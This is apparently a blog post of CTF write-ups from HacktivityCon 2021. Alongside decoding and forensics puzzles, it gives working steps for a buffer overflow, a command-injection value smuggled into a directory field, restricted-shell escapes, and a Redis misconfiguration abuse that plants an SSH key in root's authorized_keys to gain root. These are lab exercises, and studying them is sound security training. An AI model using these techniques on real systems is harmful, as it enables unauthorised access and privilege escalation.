---
layout: post
date: 2021-9-22 -0500
title: HacktivityCon 2021
author: Devang-Solanki
---

Few writeups for H@ctivityCon CTF which i was able to solve

## Target Practice

We are given a GIF file after opening we can see it has some sort of 2D barcode on it, which changes pretty quick and was looping infinitely. So i decided to split slow down GIF animation into frames, I used [lunapic](https://www10.lunapic.com/editor/) to slow down the animatiom. I knew this wired looking 2D barcode were MaxiCode. I recognized tihs because i have watched this [What Are Those Other Weird QR Codes?](https://youtu.be/KMsvtqQqz5g) video by [Thio Joe](https://www.youtube.com/user/ThioJoe). I quickly downloaded this [Bracode Scanner](https://play.google.com/store/apps/details?id=com.manateeworks.barcodescanners&hl=en_US&gl=US) on my phone and started scaning all frames from the GIF. One of the frame contained the flag
`flag{385e3ae5d7b2ca2510be8ef4}`

## 2ez

- We were given a file named 2ez.
- I tried running `file 2ez' but didn't got any useful information.
- The i checked the file headers by using `hexdump -n 36 -c 2ez' command 
![image](https://user-images.githubusercontent.com/75718583/134359824-b154eb67-2f7a-4fae-ad04-ff70fab26fc3.png)
- JFIF header means a jpeg file
- Correct header for JFIF in hex is : FF D8 FF
- But if we look at the file given to us its different, so I fixed it using `xxd -r -p -o 0 <(echo "FFD8 FEE0 0010") 2ez` this command
- Now if we open this jpeg file it has flag in it. 
`flag{812a2ca65f334ea1ab234d8af3c64d19}`

## TSUNAMI

- We were given a .wav audio file named tusnami.wav.
- Firstly i checked the audio file with [Academo](https://academo.org/demos/spectrum-analyzer/).
- On viewing spectrun of wav file we get flag at the end of audio file.
![image](https://user-images.githubusercontent.com/75718583/134361623-9e07bb83-250e-4b3a-80fa-82d880b561ec.png)

## Six Four Over Two

We were given a cipher text which looked like base32 so I decoded it and got the flag
~~~console
┌──(kali㉿kali)-[~]
└─$ echo "EBTGYYLHPNQTINLEGRSTOMDCMZRTIMBXGY2DKMJYGVSGIOJRGE2GMOLDGBSWM7IK" | base32 -d 
 flag{a45d4e70bfc407645185dd9114f9c0ef}
~~~

## Bass64

- We were given a text file in this challenge.
- File contains letters and numbers in big ASCII art.
- Which looked like this :
![image](https://user-images.githubusercontent.com/75718583/134370617-c740cd92-9184-4d9a-bd5c-7441d61a0050.png)
- It’s actually a base64 string and converting it gives the flag. 
 ```console
 ┌──(kali㉿kali)-[~/Downloads]
└─$ echo "IGZsYWd7MzVhNWQxM2RhNmEyYWZhMGM2MmJmY2JkZDYzMDFhMGF9" | base64 -d 
 flag{35a5d13da6a2afa0c62bfcbdd6301a0a} 
 ```
 
 ## Buffer Overflow 
 
 We were given a source code file containing the follwing code :
 
 ```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>

void give_flag();

void handler(int sig) {
    if (sig == SIGSEGV)
        give_flag();
}

void give_flag() {
    char *flag = NULL;
    FILE *fp = NULL;
    struct stat sbuf;

    if ((fp = fopen("flag.txt", "r")) == NULL) {
        puts("Could not open flag file.");
        exit(EXIT_FAILURE);
    }

    fstat(fileno(fp), &sbuf);

    flag = malloc(sbuf.st_size + 1);
    if (flag == NULL) {
        puts("Failed to allocate memory for the flag.");
        exit(EXIT_FAILURE);
    }

    fread(flag, sizeof(char), sbuf.st_size, fp);
    flag[sbuf.st_size] = '\0';

    puts(flag);

    fclose(fp);
    free(flag);

    exit(EXIT_SUCCESS);
}

int main() {
    char buffer[0x200];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    signal(SIGSEGV, handler);

    puts("How many bytes does it take to overflow this buffer?");
    gets(buffer);

    return 0;
}
 
 ```
On examining the code we can see a `handler()` function which print flag stored in a flag.txt file somewhere on the server once the program detects segmentation fault `SIGSEV`. For causing segmentation fault we have to overflow the buffer variable of size 0x200 (512 in decimal). 

```console
┌──(kali㉿kali)-[~]
└─$ nc challenge.ctf.games 30054  
How many bytes does it take to overflow this buffer? 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag{72d8784a5da3a8f56d2106c12dbab989}
```

## Confidentiality

- This was a simple web application which was listing all the files under given directory using `ls -la` commadn
- For exploiting this we can simply use `;` to separate our command and the system comand
`/home/user; cat /home/user/flag.txt`
![image](https://user-images.githubusercontent.com/75718583/134377008-9485de49-18dc-4e98-8324-165bc6178c85.png)

## Shelle 

- In this challenge, we got a shell with some limitations. We can only use the 7 commands cat, ls, pwd, whoami, ps, id, echo as mentioned in the assignment.txt file.

```console
Dear Students, here are the questions for your next assignment, please finish them..
If you don't wanna do the assignment you can simply submit the flag which is in the /opt directory, but hah that would be impawsible

1) What is Linux?
2) What is the difference between UNIX and LINUX?
3) What is BASH?
4) What is Linux Kernel?
5) What is LILO?
6) What is a swap space?
7) What is the advantage of open source?
8 ) What are the basic components of Linux?
9) Does it help for a Linux system to have multiple desktop environments installed?
10) What is the basic difference between BASH and DOS?


Also do learn about following linux commands.
> whoami - Prints the user name associated with the current effective user ID.
> pwd - Prints the name of current working directory
> ls - List information about the FILEs (the current directory by default)
> ps - Displays information about a selection of the active processes.
> id - Print user and group information for the specified USER, or (when USER omitted) for the current user.
> echo - display a line of text (sometimes useful to print emotes)
> cat - concatenate files and print on the standard output
```
- Most of the characters (*, !, @, ; and others) and comands were blacklisted.
- After trying every possible way I noticed `$` it was not blacklisted. 
- So, I immediately entered $SHELL which spwaned a shell for us and we got our flag.

## Bad Words

- In this challenge, we got a shell with strict limitation and were not allowed to run any command because they were bad.
- Suprisingly I tried to call command with its full path and it worked

```console
user@host:/home/user$ /bin/cat ./just/out/of/reach/flag.txt
/bin/cat just/out/of/reach/flag.txt
flag{2d43e30a358d3f30fe65cc47a9cbbe98}
```

## Redlike 

- This challenge was my favorite. All we got is an SSH command and a password for connecting to a remote server. Our task was to gain root access and read the flag in /root.
- Honestly, at first i gave up this challenge because I was not able to find any lead.
- Then I tried running linpeas.sh and from the output i got to know there was redis.conf file.
- Immediately after knowing there is a redis server exposed I googled for its exploits.
- On googling I came across this blog by [Vickie Li](https://medium.com/swlh/linux-privilege-escalation-in-four-ways-eedb52903b3) she's my favourite blogger. 
- In the blog she mentioned "If an attacker gains access to an overprivileged Redis instance, they can utilize Redis to escalate their privileges on the system. Attackers can use Redis to write their RSA public key to the `/root/.ssh/authorized_keys` file and gain root access through SSH.". After reading this i thought of trying it out.
- As per the instruction I created my rsa keys locally: 
```console
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -t rsa -b 2048 
```
- Then pad the top and bottom of the file with newlines with this `(echo -e “\n\n”; cat ~/.ssh/id_rsa.pub; echo -e “\n\n”) > key.txt` command
- Then I use redis-cli service to write the key file using `cat key.txt | redis-cli -h 127.0.0.1 -x set cmd `
- Finally, we can configures Redis and writes the public key file into the “authorized_keys” file in “/ root/.ssh”.
```console
> config set dir /root/.ssh/
> config set dbfilename "authorized_keys"
> save
```
- Now ssh as root on the machine
```console
user@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~$ ssh -i id_rsa root@127.0.0.1
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# ls
flag.txt
root@redlike-44e6479a7e6be38a-6559588cdd-ww42g:~# cat flag.txt
flag{69dc14707af23b728ebd1363715ec890}
```





